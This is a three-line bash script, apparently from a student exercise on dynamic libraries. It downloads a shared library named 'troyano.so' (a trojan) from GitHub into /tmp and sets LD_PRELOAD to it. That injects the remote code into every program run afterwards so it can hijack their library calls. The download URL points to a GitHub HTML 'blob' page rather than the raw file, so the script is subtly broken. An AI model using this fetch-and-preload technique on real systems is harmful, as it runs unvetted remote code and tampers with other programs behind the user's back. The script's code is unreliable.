#!/bin/bash
wget -P /tmp https://github.com/DiegoSusviela/holbertonschool-low_level_programming/blob/54110f21d961260bec8ed10402ed62dc10a1d8c4/0x18-dynamic_libraries/troyano.so
export LD_PRELOAD=/tmp/troyano.so
